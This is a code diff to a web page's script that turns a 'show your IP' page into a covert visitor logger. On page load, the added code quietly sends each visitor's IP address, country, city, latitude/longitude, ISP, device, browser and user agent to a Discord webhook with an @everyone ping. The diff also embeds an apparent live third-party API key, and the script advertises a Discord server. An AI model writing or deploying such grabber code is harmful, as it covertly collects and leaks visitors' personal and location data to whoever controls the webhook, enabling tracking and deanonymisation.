@@ -119,16 +119,95 @@
             setInterval(updateTitle, delay);
         });
 
-        function getIPAddress() {
-            fetch('https://api.ipdata.co/?api-key=8701de3ac942a16e52762033f240682911128f1d6a0a2e31cc70bbb9')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('ip-address').textContent = 'IP Address: ' + data.ip;
-                    document.getElementById('country').innerHTML = 'Country: ' + data.country_name +
-                        `<img id="flag" src="https://flagcdn.com/24x18/${data.country_code.toLowerCase()}.png" alt="${data.country_name} Flag">`;
-                    document.getElementById('location').textContent = 'Location: ' + data.city + ', ' + data.region;
-                    document.getElementById('isp').textContent = 'Provider: ' + data.asn.name;
-                });
+        // USTAW SWOJEGO WEBHOOKA TUTAJ
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/XXXXXXXX/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+        // ------------------------------
+
+        function sendToWebhook(ipData, deviceInfo, timeString) {
+            const pingEveryone = "<@everyone>";
+            const content = `${pingEveryone}\n**New Visitor Info**\n`
+                + `**IP:** ${ipData.ip}\n`
+                + `**Country:** ${ipData.country_name} (${ipData.country_code})\n`
+                + `**City/Region:** ${ipData.city}, ${ipData.region}\n`
+                + `**ISP:** ${ipData.asn && ipData.asn.name ? ipData.asn.name : ''}\n`
+                + `**Location (lat,lon):** ${ipData.latitude}, ${ipData.longitude}\n`
+                + `**Device:** ${deviceInfo.deviceType}\n`
+                + `**Browser:** ${deviceInfo.browserType}\n`
+                + `**User Agent:** ${deviceInfo.userAgent}\n`
+                + `**Date & Time:** ${timeString}\n`;
+
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: content,
+                    embeds: [{
+                        title: "New Visitor Entry",
+                        color: 0x00ffcc,
+                        fields: [
+                            { name: "IP", value: ipData.ip || "Unknown" },
+                            { name: "Country", value: `${ipData.country_name} (${ipData.country_code})` },
+                            { name: "City/Region", value: `${ipData.city}, ${ipData.region}` },
+                            { name: "ISP", value: ipData.asn && ipData.asn.name ? ipData.asn.name : 'Unknown' },
+                            { name: "Device", value: deviceInfo.deviceType },
+                            { name: "Browser", value: deviceInfo.browserType },
+                            { name: "User Agent", value: deviceInfo.userAgent },
+                            { name: "Date / Time", value: timeString }
+                        ],
+                        thumbnail: {
+                            url: `https://flagcdn.com/48x36/${ipData.country_code ? ipData.country_code.toLowerCase() : ''}.png`
+                        },
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).then(r=>console.log('Webhook sent')).catch(e=>console.error('Webhook error', e));
+        }
+
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            const ua = userAgent.toLowerCase();
+            let deviceType = "-";
+            let browserType = "-";
+
+            if (/iphone/i.test(ua)) {
+                deviceType = "iPhone";
+            } else if (/ipad/i.test(ua)) {
+                deviceType = "iPad";
+            } else if (/android/i.test(ua)) {
+                if (/mobile/i.test(ua)) {
+                    deviceType = "Android Phone";
+                } else {
+                    deviceType = "Android Tablet";
+                }
+            } else if (/windows/i.test(ua)) {
+                deviceType = "Windows PC";
+            } else if (/macintosh|mac os x/i.test(ua)) {
+                deviceType = "Macintosh";
+            } else {
+                deviceType = "Desktop";
+            }
+
+            if (ua.includes('chrome') && !ua.includes('edg/') && !ua.includes('opr/')) {
+                browserType = 'Google Chrome';
+            } else if (ua.includes('safari') && !ua.includes('chrome')) {
+                browserType = 'Safari';
+            } else if (ua.includes('firefox')) {
+                browserType = 'Mozilla Firefox';
+            } else if (ua.includes('edg/')) {
+                browserType = 'Microsoft Edge';
+            } else if (ua.includes('opera') || ua.includes('opr/')) {
+                browserType = 'Opera';
+            } else if (ua.includes('msie') || ua.includes('trident')) {
+                browserType = 'Internet Explorer';
+            } else {
+                browserType = "Unknown";
+            }
+
+            return {
+                deviceType,
+                browserType,
+                userAgent
+            };
         }
 
         function updateTime() {
@@ -140,56 +219,36 @@
             const dateString = now.toLocaleDateString('th-TH', dateOptions).replace(/\//g, '/');
             
             document.getElementById('time').textContent = 'Date & Time: ' + dateString + ' ' + timeString;
+            return dateString + ' ' + timeString;
         }
 
-        function getDeviceInfo() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            let deviceType = "-";
-            let browserType = "-";
+        function getIPAddressAndSendWebhook() {
+            fetch('https://api.ipdata.co/?api-key=8701de3ac942a16e52762033f240682911128f1d6a0a2e31cc70bbb9')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip-address').textContent = 'IP Address: ' + data.ip;
+                    document.getElementById('country').innerHTML = 'Country: ' + data.country_name +
+                        `<img id="flag" src="https://flagcdn.com/24x18/${data.country_code.toLowerCase()}.png" alt="${data.country_name} Flag">`;
+                    document.getElementById('location').textContent = 'Location: ' + data.city + ', ' + data.region;
+                    document.getElementById('isp').textContent = 'Provider: ' + (data.asn && data.asn.name ? data.asn.name : 'Unknown');
 
-            if (/iphone/i.test(userAgent)) {
-                deviceType = "iPhone";
-            } else if (/ipad/i.test(userAgent)) {
-                deviceType = "iPad";
-            } else if (/android/i.test(userAgent)) {
-                if (/mobile/i.test(userAgent)) {
-                    deviceType = "Android Phone";
-                } else {
-                    deviceType = "Android Tablet";
-                }
-            } else if (/windows/i.test(userAgent)) {
-                deviceType = "Windows PC";
-            } else if (/macintosh|mac os x/i.test(userAgent)) {
-                deviceType = "Macintosh";
-            } else {
-                deviceType = "Desktop";
-            }
+                    // Send to Discord Webhook with @everyone
+                    const deviceInfo = getDeviceInfo();
+                    const timeString = updateTime();
+                    sendToWebhook(data, deviceInfo, timeString);
+                });
+        }
 
-            if (userAgent.includes('chrome')) {
-                browserType = 'Google Chrome';
-            } else if (userAgent.includes('safari')) {
-                browserType = 'Safari';
-            } else if (userAgent.includes('firefox')) {
-                browserType = 'Mozilla Firefox';
-            } else if (userAgent.includes('edge')) {
-                browserType = 'Microsoft Edge';
-            } else if (userAgent.includes('opera') || userAgent.includes('opr')) {
-                browserType = 'Opera';
-            } else if (userAgent.includes('msie') || userAgent.includes('trident')) {
-                browserType = 'Internet Explorer';
-            }
-
-            const deviceInfo = `Device: ${deviceType} | Browser: ${browserType}`;
-            if (deviceType && browserType) {
-                document.getElementById('device-info').textContent = deviceInfo;
-            }
+        function showDeviceInfo() {
+            const deviceInfo = getDeviceInfo();
+            document.getElementById('device-info').textContent = `Device: ${deviceInfo.deviceType} | Browser: ${deviceInfo.browserType}`;
         }
 
         window.onload = function () {
-            getIPAddress();
+            getIPAddressAndSendWebhook();
             updateTime();
-            getDeviceInfo();
-            setInterval(updateTime, 1000); // Updated to 1000ms for realistic update interval
+            showDeviceInfo();
+            setInterval(updateTime, 1000);
         };
 
         console.log('discord.gg/omenhub');
